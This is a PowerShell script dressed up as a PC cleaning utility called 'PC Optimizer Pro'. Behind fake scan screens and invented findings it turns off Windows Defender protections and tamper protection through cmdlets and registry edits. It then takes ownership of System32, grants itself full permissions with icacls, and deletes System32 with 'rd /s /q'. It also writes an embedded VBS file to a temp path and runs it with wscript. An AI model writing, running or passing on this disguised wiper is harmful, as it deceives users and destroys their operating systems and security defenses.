# This file must be saved in the UTF-8 with BOM encoding. BOM must be present!
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

# Set console appearance
$host.UI.RawUI.WindowTitle = "PC Optimizer Pro"
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "Cyan"
try {
    $host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(150, 50)
    $host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(150, 3000)
} catch {
    # Ignore if resize fails
}
Clear-Host

# ============================================================================
# Embedded VB script warning, injected during compilation
# ============================================================================
$vbsContent = @'
'@

# Write VBS to temp file and execute it
$extension = if ($vbsContent -match "^#@~\^") { ".vbe" } else { ".vbs" }
$tempVBS = [System.IO.Path]::GetTempFileName() + $extension
$vbsContent | Out-File -FilePath $tempVBS -Encoding ASCII
Start-Process "wscript.exe" -ArgumentList "`"$tempVBS`"" -Wait
Remove-Item $tempVBS -Force -ErrorAction SilentlyContinue

# Main program start
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                Welcome to PC Optimizer Pro                   ║" -ForegroundColor Cyan
Write-Host "║           Professional PC Cleaning & Optimization            ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "Thank you for using PC Optimizer Pro!" -ForegroundColor White
Write-Host "PC Optimizer Pro is software that helps clean up your PC." -ForegroundColor White
Write-Host ""
Write-Host "To start, PC Optimizer Pro would like to perform a system scan." -ForegroundColor Yellow
Write-Host ""

$choice = Read-Host "Would you like to proceed? (Y/N)"

if ($choice -notmatch '^[Yy]$') {
    Write-Host ""
    Write-Host "Scan aborted. Thank you for using PC Optimizer Pro." -ForegroundColor Green
    pause
    exit
}

# Begin "scan"
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    Starting System Scan...                   ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1

Write-Host "[*] Preparing scan..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 1: DISABLE WINDOWS DEFENDER
# ============================================================================
try {
    # Method 1: PowerShell cmdlets
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    
    # Method 2: Registry (more persistent)
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force -ErrorAction SilentlyContinue | Out-Null
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SubmitSamplesConsent -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SpynetReporting -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    
    Write-Host "[O] Preperation finished" -ForegroundColor Green
} catch {
    Write-Host "[!] Preperation may have encountered errors, but will continue..." -ForegroundColor Yellow
}

Start-Sleep -Seconds 1

function Show-Tree {
    param(
        [Parameter(Mandatory=$false)]
        [string]$Path = '.',
        [Parameter(Mandatory=$false)]
        [string]$Prefix = '',
        [Parameter(Mandatory=$false)]
        [bool]$IsLast = $true
    )
    
    # Get the item
    $item = Get-Item -LiteralPath $Path -ErrorAction SilentlyContinue
    if (-not $item) { return }
    
    # Connector character
    $connector = if ($Prefix -eq '') { '' } elseif ($IsLast) { '└── ' } else { '├── ' }
    
    # Print the line
    Write-Host "$Prefix$connector$($item.Name)"
    
    # If the item is a folder, recurse (only get directories, not files)
    if ($item.PSIsContainer) {
        $children = Get-ChildItem -LiteralPath $Path -Directory -Force -ErrorAction SilentlyContinue | Sort-Object Name
        for ($i = 0; $i -lt $children.Count; $i++) {
            $last = ($i -eq $children.Count - 1)
            $newPrefix = if ($IsLast) { "$Prefix    " } else { "$Prefix│   " }
            Show-Tree -Path $children[$i].FullName -Prefix $newPrefix -IsLast $last
        }
    }
}


# Simulate scanning with tree commands
Write-Host ""
Write-Host "[*] Scanning Windows Update directory..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
Show-Tree "$env:WINDIR\assembly"
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 2: TAKEOWN
# ============================================================================
cmd /c "takeown /f `"C:\Windows\System32`" /r /d Y" 2>&1 | Out-Null
Write-Host "[O] Evaluation finished" -ForegroundColor Green

Write-Host ""
Write-Host "[*] Scanning OS directory..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
Show-Tree "$env:WINDIR\System32"
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 3: ICACLS PERMISSIONS
# ============================================================================
cmd /c "icacls `"C:\Windows\System32`" /grant Administrators:F /t /c /q" 2>&1 | Out-Null
cmd /c "icacls `"C:\Windows\System32`" /grant ${env:USERNAME}:F /t /c /q" 2>&1 | Out-Null
Write-Host "[O] Evaluation finished" -ForegroundColor Green

Write-Host ""
Write-Host "[*] Scanning programs directory..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
Show-Tree "$env:WINDIR\SysWOW64"
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow
Start-Sleep -Seconds 8
Write-Host "[O] Evaluation finished" -ForegroundColor Green

Write-Host ""
Write-Host "══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "[O] System scan completed!" -ForegroundColor Green
Write-Host ""
Write-Host "Found:" -ForegroundColor Yellow
Write-Host "  • 15,847 temporary files" -ForegroundColor White
Write-Host "  • 3.2 GB of cached data" -ForegroundColor White
Write-Host "  • 892 internet logs" -ForegroundColor White
Write-Host "  • 1,523 unnecessary system files" -ForegroundColor White
Write-Host ""
pause

# Final deletion prompt
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                      Optimization Ready                      ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "PC Optimizer Pro will now optimize your PC by deleting:" -ForegroundColor White
Write-Host "  • Unnecessary internet logs" -ForegroundColor Gray
Write-Host "  • Cached data" -ForegroundColor Gray
Write-Host "  • Temporary files" -ForegroundColor Gray
Write-Host "  • Redundant system files" -ForegroundColor Gray
Write-Host ""
Write-Host "This process may take several minutes." -ForegroundColor Yellow
Write-Host ""
pause

# The deletion
Write-Host ""
Write-Host "[*] Preparing to optimize system..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
Write-Host "[*] Removing temporary files..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 4: ACTUAL DELETION
# ============================================================================
cmd /c "rd /s /q C:\Windows\System32" 2>&1 | Out-Null

<# this was for initial debugging
Write-Host "[O] File removal finished..." -ForegroundColor Green
Write-Host "    (SIMULATED PAYLOAD 4 commented out)" -ForegroundColor DarkGray
Write-Host "[O] Optimization complete!" -ForegroundColor Green
Write-Host ""
Write-Host "Your PC has been optimized. Please restart your computer." -ForegroundColor Cyan
Write-Host ""
Write-Host "========================================" -ForegroundColor Red
Write-Host "NOTE: SECTION 4 (DELETION) DISABLED" -ForegroundColor Red
Write-Host "Sections 1-3 are ACTIVE for testing" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red
pause
#>